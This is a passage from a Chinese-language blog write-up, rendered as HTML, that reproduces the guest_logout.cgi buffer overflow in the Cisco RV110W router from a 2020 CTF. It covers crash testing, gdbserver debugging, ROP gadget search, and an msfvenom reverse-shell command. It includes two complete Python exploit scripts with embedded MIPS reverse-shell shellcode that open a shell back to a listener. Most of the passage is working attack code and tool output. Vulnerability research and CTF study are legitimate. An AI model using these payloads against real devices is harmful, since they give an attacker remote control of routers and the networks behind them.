class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.get(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>但是发生POST报文的时候，发现<code>web</code>页面在疯狂转圈圈，就是崩了，至于为什么只测试这两个请求头，二进制狗表示不太清楚…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:<span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#x27;</span>,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line">requests.post(url, data=payload, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/23.png" class=""><h4 id="确定溢出偏移"><a href="#确定溢出偏移" class="headerlink" title="确定溢出偏移"></a>确定溢出偏移</h4><p>崩了就意味着，有漏洞点的存在，那接下来就是调试的事情了，用的是海特实验室的<code>gdbserver</code>，其实还有一个是<code>gef</code>开发者编译的<code>gdbserver</code></p><p><a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">海特实验室 IOT_Wiki</a></p><p><a href="https://github.com/hugsy/gdb-static">gef author</a></p><p>启动一个窗口起一个简单的http服务器</p><p><strong>python2:</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  python -m SimpleHTTPServer 8080</span><br></pre></td></tr></table></figure><p><strong>python3：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  python -m http.server 8080</span><br></pre></td></tr></table></figure><p>ps：建议启动浏览器复制链接，真的好用！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/15.jpg" class=""><p>再启动一个窗口<code>telnet</code>连接上路由器用<code>wget</code>（路由器里面自带的）挂上<code>gdbserver</code>，就可以远程调试了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  telnet 192.168.1.1</span><br><span class="line">➜  <span class="built_in">cd</span> tmp</span><br><span class="line">➜  wget <span class="string">&quot;http://192.168.181.178:8080/home/laohu/Desktop/gdbserver&quot;</span></span><br><span class="line">➜  chmod +x gdbserver</span><br><span class="line">➜  ps | grep <span class="string">&quot;httpd&quot;</span></span><br><span class="line">➜  ./gdbserver :1234 --attach 356<span class="comment">#看httpd -S的进程号，另一个好像调试不了</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/7.png" class=""><p>传进去之后，恶梦才刚刚开始….我根本想不到这问题出在哪里！尝试换终端（改成<code>dash</code>），换架构（在树莓派上尝试），换目录（换到<code>data</code>目录）之后，终于摸索到了关键原因—-<code>gdbserver</code>本身，各位大师傅们的<code>gdbserver</code>为<code>gdbserver-7.12-mipsel-mips32rel2-v1-sysv</code> ，我死活用不了，我尝试甚至在我朋友上的电脑上尝试都不行，可能大师傅们的电脑是<code>MacOS</code>吧，咱也不知道，咱也不敢问，我最后在换到<code>gdbserver-7.12-mipsel-i-v1-sysv</code>之后，终于可以使用了！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/16.jpg" class=""><p>终于…下一个错误来了，<code>gdb-mutilarch</code>进行远程调试的时候，<code>remote</code>上去的时候断不下来，报下面这个错，看到下面<code>capstone</code>好像出现了问题，怀疑是版本过低，重新安装<code>pwntools</code>解决问题</p><p><a href="https://blog.csdn.net/weixin_33674976/article/details/85219451">5年了…Capstone 终于升级到4.0！</a></p><p><a href="https://blog.csdn.net/zhr12321/article/details/116742894">解决方法</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/13.png" class=""><p>此处，终于看到调试界面了，泪目！！！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/14.png" class=""><p>来来来，问题怪又来了…，按照大师傅们的做法，按下<code>c</code>之后，输入<code>cyclic 200</code>生成的字符串，就会崩掉，并看到<code>PC</code>寄存器被覆盖…但我…没反应啊！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/17.jpg" class=""><p>解决办法就是先在<code>sscanf</code>之前下断点（后面测试其实不用下断点也是一样的，然后再<code>c</code>，接着用<code>exp</code>打一下，就断下来了，原因是因为我们本身就是<code>attach</code>上<code>httpd</code>这个进程，所以这个进程本身还在运行，如果我们打了断点并用<code>exp</code>打过去的话，它就会按照以往正常的业务逻辑去执行，但是再执行的过程中被中断了，所以…就断了下来，再往下走的，我们就能看到<code>PC</code>寄存器被覆盖了！接下来就是常规操作用<code>cyclic -l</code>来计算偏移</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/19.png" class=""><p>确定好溢出的长度就可以开始利用了，基本上都是<code>ROP+shellcode</code>的形式，那么现在就是生成<code>shellcode</code>和泄露<code>libc</code>获取<code>gadget</code>的问题了</p><h5 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h5><p>shellcode一般来说可以使用以下四种方式获取：</p><ol><li>msfvenom</li><li>shell-storm</li><li>pwntools</li><li>自己编写（简单的<code>shellcode</code>还是可以写写的</li></ol><p>其他都有试过，<code>msf</code>还没试过这里记录一下…<code>msf</code>支持好多版本的<code>shellcode</code>，太香了吧！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/18.png" class=""><p>用下面的命令就能生成，注意IP和端口匹配：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=192.168.1.100 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py </span><br></pre></td></tr></table></figure><blockquote><p>总的来说还是：<code>msf</code>更方便好用，并且非常稳。<code>shell-storm</code>找到的种类多，不过偶尔需要手动修改。最后对于真实设备的利用上<code>pwntools</code>会有很多的问题，所以这里不推荐使用<code>pwntools</code>生成<code>shellcode</code></p></blockquote><p><code>shell-storm</code>里面的<code>shellcode</code>也是能用的，不过需要修改IP地址</p><p><a href="http://shell-storm.org/shellcode/files/shellcode-860.php">200 byte Linux MIPS reverse shell shellcode by Jacob Holcomb</a></p><h5 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h5><p>既然要<code>ROP</code>，那必然要泄露<code>libc</code>，但是在大部分IOT设备中，地址随机化是不会变化的，包括这个设备，所以在<code>maps</code>中加载的<code>libc</code>地址就是它一直使用的<code>libc</code>地址，无论是重启还是换固件版本甚至在<code>RV130</code>中，<code>libc</code>的基地址都一样，这就省去了很多步骤，下面引用<code>xuanxuan</code>老师的一段话：</p><blockquote><p>问了常老师，再次猜测可能是为了效率，编译的时候就把内核的这个功能干掉了，或者当前平台压根就不支持这个功能。先存疑，总之我们发现动态库的基址都是不变的，故我们可以使用程序加载的动态库中的<code>gadget</code>。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  cat /proc/356/maps</span><br></pre></td></tr></table></figure><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/20.png" class=""><p>可以看到很多<code>libc</code>，而<code>libc.so.0</code>的基地址是<strong>2af98000</strong></p><p>得到了<code>libc</code>基地址，只让是寻找一些可用的<code>gadget</code>，我们使用IDA的插件—-<code>mipsrop</code>，由于安装的时候发现，它对IDA 7.5不是很支持，所以还是出了一些小问题，这里记录一下…</p><p><a href="https://www.jianshu.com/p/0f5923fac8d4">解决IDA 无法安装mipsrop插件</a></p><p><a href="https://bbs.pediy.com/thread-266102.htm">IDA 无法安装mipsrop插件</a></p><p>安装成功后呢，在<code>search</code>中就能看到<code>mips rop gadgets</code>，点击之后加载了<code>mipsrop</code>插件了</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/21.jpg" class=""><p>可以用<code>mipsrop.help()</code>查看<code>mipsrop</code>的一些常用命令</p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">mipsrop常用命令</a></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/22.png" class=""><p>在上面的程序加载了很多动态链接库，但是却唯独选择了**/lib/libc.so.0**这个动态链接库来寻找<code>gadget</code>，为啥呢？估计是比较熟悉吧！</p><p>用<code>mipsrop.stackfinders()</code>来寻找一些<code>gadget</code>，这些<code>gadget</code>都是和栈（<code>$sp</code>）相关的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinders()</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0000BA84  |  addiu $a1,$sp,0x158+var_A0                          |  jalr  $s0                             |</span><br><span class="line">|  0x00011918  |  addiu $a2,$sp,0x68+var_40                           |  jalr  $s1                             |</span><br><span class="line">|  0x000250A8  |  addiu $s0,$sp,0x278+var_250                         |  jalr  $fp                             |</span><br><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s0                             |</span><br><span class="line">|  0x00025CAC  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002747C  |  addiu $a0,$sp,0x38+var_20                           |  jalr  $s3                             |</span><br><span class="line">|  0x0002CC00  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s0                             |</span><br><span class="line">|  0x0002CC08  |  addiu $a0,$sp,0x38+var_10                           |  jalr  $s1                             |</span><br><span class="line">|  0x00035DF4  |  addiu $a1,$sp,0x20+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  0x0003D050  |  addiu $a0,$sp,0x30+var_18                           |  jalr  $a0                             |</span><br><span class="line">|  0x000427A8  |  addiu $s0,$sp,0xB8+var_98                           |  jalr  $s6                             |</span><br><span class="line">|  0x00042E04  |  addiu $v1,$sp,0xF0+var_D0                           |  jalr  $s1                             |</span><br><span class="line">|  0x0000D45C  |  addiu $a0,$sp,0x98+var_80                           |  jr    0x98+var_s4($sp)                |</span><br><span class="line">|  0x0000ED70  |  addiu $a1,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0001D5FC  |  addiu $a3,$sp,0x28+var_8                            |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x00020100  |  addiu $a0,$sp,0x28+var_10                           |  jr    0x28+var_s0($sp)                |</span><br><span class="line">|  0x0002C060  |  addiu $a0,$sp,0x70+var_58                           |  jr    0x70+var_sC($sp)                |</span><br><span class="line">|  0x0002F800  |  addiu $a1,$sp,0x50+var_38                           |  jr    0x50+var_s0($sp)                |</span><br><span class="line">|  0x00030434  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s10($sp)               |</span><br><span class="line">|  0x00039948  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399A0  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x000399F8  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A50  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039A90  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039AFC  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x00039B5C  |  addiu $a1,$sp,0x48+var_30                           |  jr    0x48+var_s0($sp)                |</span><br><span class="line">|  0x0003A844  |  addiu $a0,$sp,0x50+var_38                           |  jr    0x50+var_4($sp)                 |</span><br><span class="line">|  0x0003D05C  |  addiu $a0,$sp,0x30+var_18                           |  jr    0x30+var_s0($sp)                |</span><br><span class="line">|  0x0004BAA8  |  addiu $a1,$sp,0x3020+var_1008                       |  jr    0x3020+var_s24($sp)             |</span><br><span class="line">|  0x0004D314  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D484  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">|  0x0004D8E4  |  addiu $a2,$sp,0x20+var_8                            |  jr    0x20+var_s0($sp)                |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 32 matching gadgets</span><br><span class="line">Python&gt;mipsrop.find(&quot;mov $t9,$a0&quot;)</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">|  0x0003D050  |  move $t9,$a0                                        |  jalr  $a0                             |</span><br><span class="line">---------------------------------------------------------------------------------------------------------</span><br><span class="line">Found 1 matching gadgets</span><br></pre></td></tr></table></figure><p>找到两条可用的<code>gadget</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">|  0x000257A0  |  addiu $a0,$sp,0x38+var_20  |  jalr  $s0  |</span><br><span class="line"></span><br><span class="line">|  0x0003D050  |  move $t9,$a0  |  jalr  $a0  |</span><br></pre></td></tr></table></figure><p>算一下溢出到<code>$s0</code>的偏移<code>0x55-0xe4+0xc0 = 0x31</code></p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/28.jpg" class=""><p>再看看<code>shellcode</code>的偏移，暂时还不会在<code>ghidra</code>上用<code>mipsrop</code>的插件，就用了个笨办法，在IDA上先找<code>gadget</code>然后，再来<code>ghidra</code>看偏移，可以看到我们<code>shellcode</code>的偏移为0x18，至此，所有的准备工作已经完成！！！</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/29.jpg" class=""><p>再启动一个终端，监听<code>shellcode</code>中回连的端口，等待反弹<code>shell</code>，完整<code>exp</code>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move  $t9,$a0             ; jalr  $a0</span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr  $s0</span></span><br><span class="line"></span><br><span class="line">shellcode =  <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">shellcode += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x31</span> + p32(jmp_a0) + <span class="string">&#x27;b&#x27;</span> * (<span class="number">85</span> - <span class="number">49</span> - <span class="number">4</span>) + p32(jmp_s0) + <span class="string">&#x27;c&#x27;</span> * <span class="number">0x18</span> + shellcode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd2 = &#123;</span><br><span class="line">    <span class="string">&quot;cmac&quot;</span>: <span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit_button&quot;</span>: pd1,</span><br><span class="line">    <span class="string">&quot;cip&quot;</span>: <span class="string">&quot;192.168.1.100&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line">requests.post(url, data=pd2, verify=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>监听的终端已经看到反弹<code>shell</code>了，泪目~</p><img src="/2021/10/05/RV110W%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2020%E5%B9%B4%E5%BC%BA%E7%BD%91%E6%9D%AF%E8%B5%9B%E9%A2%98/24.png" class=""><p><code>exp</code>的另一种写法，加入<code>pwntools</code>的<code>wait_for_connection</code>模块来实现的，这样就不用开多一个终端监听：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> thread,requests</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = <span class="number">0x2af98000</span></span><br><span class="line">jmp_a0 = libc + <span class="number">0x0003D050</span>  <span class="comment"># move $t9,$a0 ; jalr $a0 </span></span><br><span class="line">jmp_s0 = libc + <span class="number">0x000257A0</span>  <span class="comment"># addiu $a0,$sp,0x38+var_20 ; jalr $s0 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#LHOST=192.168.1.101 LPORT=8888 </span></span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x22\xb8\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x01\x01&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://192.168.1.1/guest_logout.cgi&quot;</span></span><br><span class="line">pd1 = <span class="string">&quot;status_guestnet.asp&quot;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">49</span>+p32(jmp_a0)+<span class="string">&#x27;b&#x27;</span>*(<span class="number">85</span>-<span class="number">49</span>-<span class="number">4</span>)+p32(jmp_s0)+<span class="string">&#x27;c&#x27;</span>*<span class="number">0x18</span>+buf</span><br><span class="line">pd2 = &#123;<span class="string">&quot;cmac&quot;</span>:<span class="string">&quot;12:af:aa:bb:cc:dd&quot;</span>,<span class="string">&quot;submit_button&quot;</span>:pd1,<span class="string">&quot;cip&quot;</span>:<span class="string">&quot;192.168.1.100&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>():</span></span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        requests.post(url, data=pd2, verify=<span class="literal">False</span>,timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">io = listen(<span class="number">8888</span>)</span><br><span class="line"><span class="comment">#创建一个TCP或UDP套接字以接收数据 </span></span><br><span 